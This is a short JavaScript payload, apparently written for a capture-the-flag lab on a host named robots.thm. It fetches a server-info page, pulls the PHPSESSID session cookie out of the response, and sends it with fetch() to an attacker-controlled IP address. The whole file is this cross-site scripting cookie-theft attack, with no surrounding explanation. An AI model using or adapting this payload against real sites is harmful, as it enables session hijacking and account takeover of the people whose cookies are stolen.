var url = "http://robots.thm/harm/to/self/server_info.php";
var attacker = "http://192.168.242.92/exfil";
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function () {
  if (xhr.readyState == XMLHttpRequest.DONE) {
    var cookiev = xhr.responseText.match(/PHPSESSID=([a-zA-Z0-9]+)/);
    if (cookiev) {
      fetch(attacker + "?cookie=" + cookiev[1]);
    }
  }
};

xhr.open("GET", url, true);
xhr.send(null);
